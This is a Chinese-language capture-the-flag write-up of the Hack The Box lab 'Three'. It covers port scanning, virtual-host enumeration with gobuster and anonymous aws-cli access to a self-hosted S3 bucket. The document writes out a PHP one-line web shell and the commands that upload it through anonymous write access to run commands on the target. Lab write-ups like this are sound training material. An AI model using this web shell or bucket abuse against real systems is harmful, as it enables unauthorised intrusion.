---
title: Three AWS泄露
category:
  - 打靶
  - HTB
  - AI+
date: 2025-09-21
---
[[toc]]
## 参考资料
## 分题列表
### 1. 开放了多少个TCP端口
```sh
nmap -p- -sV -T5 10.129.88.135 ×
nmap -sV 10.129.88.135 √
```
`-T5`参数在这种高延迟的网络中不太好使……
```
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
```
所以是开放了**2**个端口

### 2. 网站的`Contact`板块中的邮箱地址的域名是什么
![](assets/Pasted%20image%2020250921182456.png)
firefox因为Kali不够运行内存导致打不开，只能下下来然后本地渲染了，幸好页面板块都在一个html里

```
thetoppers.htb
```
### 3. DNS服务器无效时，Linux会通过哪个文件解决域名解析
```
/etc/hosts
```
![](assets/Pasted%20image%2020250921182656.png)
（10.129.42.55是其他题目留下来的）
### 4. 子域名挖掘时得到了哪个子域名
```sh
subfinder -d thetoppers.htb
```
用ProjectDiscovery开发的subfinder或国人开发的ksubdomain都可以，但subfinder是被动扫描，ksubdomain是主动解析，前者快，后者更多用于探活
![](assets/Pasted%20image%2020250921182922.png)
死活扫不出来，后面看WP发现域名就是归属于靶机IP的——我就说上一小题怎么提到了`/etc/hosts`
![](assets/Pasted%20image%2020250921183540.png)
去加上先
![](assets/Pasted%20image%2020250921184044.png)
配了之后一样爆炸
看来靶机域名这种特定DNS服务器才有效的场景下用不了subfinder这种更正统的子域名枚举工具

现在考虑目标服务器不止托管了一个域名的情况
:::tip
> **对任何Web服务器，都要系统性地枚举其所有可能的攻击面，而虚拟主机（VHOST）就是其中一个标准攻击面。**

:::

```sh
apt install gobuster && gobuster vhost -w /usr/share/dnsrecon/dnsrecon/data/subdomains-top1mil-5000.txt -u http://thetoppers.htb --append-domain
```
gobuster就提供了`vhost`参数，用于尝试访问不同的子域名组合
（官方WP里给的字典路径不一定符合个人情况）
（高于`3.2.0`版本的Gobuster还需要使用`--append-domain`参数确保子域名字典被正确拼接到`.thetoppers.htb`前面）
![](assets/Pasted%20image%2020250921190310.png)
gobuster在`vhost`模式下会发送携带了子域名`<subdomain_frac>.thetoppers.htb`的HOST请求头的HTTP请求，目标服务器会根据`Host`头的内容返回特定页面，gobuster则根据状态码判断子域名（VHOST）是否有效
![](assets/Pasted%20image%2020250921191104.png)
当然，能扫出`404`就行了，很多都是`400 Bad Request`和超时
```
s3.thetoppers.htb
```
### 5. `s3.thetoppers.htb`上运行着什么服务
先把`/etc/hosts`也改好
![](assets/Pasted%20image%2020250921191330.png)
![](assets/Pasted%20image%2020250921191605.png)
子域名是`s3`的话，那么可能是AWS服务

```
Amazon s3
```
![](assets/Pasted%20image%2020250921191751.png)
### 6. 哪个CLI工具可用于与目标子域名的AWS服务交互
```
awscli
```
![](assets/Pasted%20image%2020250921192207.png)
### 7. 哪个指令用于初始化[AWSCLI配置](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html)
```sh
curl "https://awscli.amazonaws.com/awscli-exe-linux-x86_64.zip" -o "awscliv2.zip"
unzip awscliv2.zip
sudo ./aws/install
# 更新指令
./aws/install --bin-dir /usr/local/bin --install-dir /usr/local/aws-cli --update

```
答案是下面这个：
```
aws configure
```
![](assets/Pasted%20image%2020250921192834.png)
在使用awscli与云服务交互前必须配置访问密钥……这里瞎填也能过……
![](assets/Pasted%20image%2020250921193540.png)
:::tip
靶机的S3服务并没有严格校验身份，考虑到这是打靶，所以也可以使用`aws <其他指令> --no-sign-request`来启动**匿名访问**
:::

### 8. 哪条指令用于列出所有S3桶
对应`s3:ListBucket`权限
```sh
┌──(root?kali)-[/]
└─# aws --endpoint=http://s3.thetoppers.htb s3 ls
2025-09-21 06:55:06 thetoppers.htb
                                      
```
`--endpoint=xxx`参数用于覆盖默认URL（默认URL也即Amazon的官方S3服务器，这里靶机的S3服务本来也是自托管的）

那么，答案是：
```sh
aws s3 ls
```
:::tip
这里可以显式使用匿名访问：
```sh
aws --endpoint=http://s3.thetoppers.htb s3 ls --no-sign-request
```
:::

### 9. 服务器可以运行哪种web脚本语言
接上一题，`ls`可以接一个路径，查询包含指定路径作为前缀的桶对象：
> We can also use the `ls` command to list objects and common prefixes under the specified bucket

上一小题，我们使用`ls`指令获得了目标服务的桶列表（这也说明我们的匿名访问拥有**访问桶的权限**）
```sh
aws --endpoint=http://s3.thetoppers.htb s3 ls --no-sign-request

2025-09-21 06:55:06 thetoppers.htb # thetoppers.htb就是一个桶了
```
（这里`s3`是服务名）
接下来进一步查看`<服务名>://<桶名>`内的文件
```sh
aws --endpoint=http://s3.thetoppers.htb s3 ls s3://thetoppers.htb
```
![](assets/Pasted%20image%2020250921194038.png)
那么，这是个PHP服务器……PHP网页，并且`s3://theroppers.htb`下有这些个东西（甚至还有个`images/`目录）

```
PHP
```
### 10. 拿flag
`aws`还提供了上传文件的指令：（对应`s3:GetObject`权限）
```sh
aws --endpoint=http://s3.thetoppers.htb s3 cp <本地文件的路径> <远程目录>

echo "<?php system(\$_GET['cmd']);?>" > shell.php
aws --endpoint=http://s3.thetoppers.htb s3 cp shell.php s3://thetoppers.htb
```

:::tip
这里`cp`指令后面先接远程路径后接本地文件路径的话则是**下载文件**，对应`s3:GetObject`权限
```shell
┌──(root㉿kali)-[/]
└─# aws --endpoint=http://s3.thetoppers.htb s3 cp s3://thetoppers.htb/index.php .index   
download: s3://thetoppers.htb/index.php to ./.index
```
:::


![](assets/Pasted%20image%2020250921194649.png)
（getshell那里打错指令了）
> 上传文件后返回`uploaded xxx`，说明我们的匿名访问拥有**写权限**
 
接下来就是getshell了
![](assets/Pasted%20image%2020250921194804.png)
![](assets/Pasted%20image%2020250921195050.png)![](assets/Pasted%20image%2020250921195354.png)
```
a980d99281a28d638ac68b9bf9453c2b
```

***
## 回顾和总结
1. 公式化Nmap端口扫描，高时延环境下建议不要带上`-T5`参数，默认的`-T3`就够了
2. HTTP访问靶机，浏览各个板块，收集得到域名`thetoppers.htb`
3. 尝试子域名枚举，先用[**subfinder**](https://github.com/projectdiscovery/subfinder)试试公网已记录的资产；HTB靶机的域名在公网的资产引擎中肯定是没有记录的，这时可以试试`gobuster vhost -u http://example.com`或`ffuf -u http://FUZZ.example.com`爆破子域名
	*（我没试过）*
	- 在这一步还可以试试[**gospider**](https://github.com/jaeles-project/gospider)递归爬取目标站点的URL和JS文件
	- 如果能拿到JS文件那么可以上[**LinkFinder**](https://github.com/GerbenJavado/LinkFinder)和**[SecretFinder](https://github.com/m4ll0k/SecretFinder)**深度分析JS文件中的API端点和密钥
	- **ffuf**和**Arjun**可以用来发现页面上的隐藏参数，后者则专门用于枚举隐藏参数
4. 爆破得到子域名（`s3.thetoppers.htb`后）访问上去发现是个AWS S3（自托管）服务
   （看URL也能顶针出来）。使用[AWSCLI](https://docs.aws.amazon.com/cli/latest/userguide/getting-started-install.html) `aws --endpoint=http://s3.thetoppers.htb --nosign-request s3 ls`尝试**初始匿名访问**并列出云服务上的文件列表。这里`s3`是服务名，`--endpoint`用于覆盖默认的AWS官方云服务URL，匹配靶机的自托管服务
5. 依次测试当前匿名访问的权限：
	1. **访问权限**
		```sh
		aws --endpoint=<目标的S3自托管服务URL> --nosign-request s3 ls s3://<列表前缀>
		# 列出thetoppers.htb桶中的文件
		aws --endpoint=http://s3.thetoppers.htb --nosign-request s3 ls s3://thetoppers.htb
		```
	2. **读权限**（把文件下载到本地）
		```sh
		aws --endpoint=<目标的S3自托管服务URL> --nosign-request s3 cp <完整的远程文件路径> <本地目的文件路径>
		aws --endpoint=http://s3.thetoppers.htb  --nosign-request s3 cp s3://thetoppers.htb/index.php ./index.php
		```
	3. **写权限**（上传文件）
		```sh
		aws --endpoint=<目标的S3自托管服务URL> --nosign-request s3 cp <本地完整文件路径> s3://<远程目录>
		aws --endpoint=http://s3.thetoppers.htb --nosign-request s3 cp ./shell.php s3://thetoppers.htb/
		```
6. **写权限**可用的话就可以上传shell了，这里上传的是PHP一句话木马，然后浏览器直接访问拿flag
   也可以像官方WP那样用PHP一句话木马做跳板打反弹shell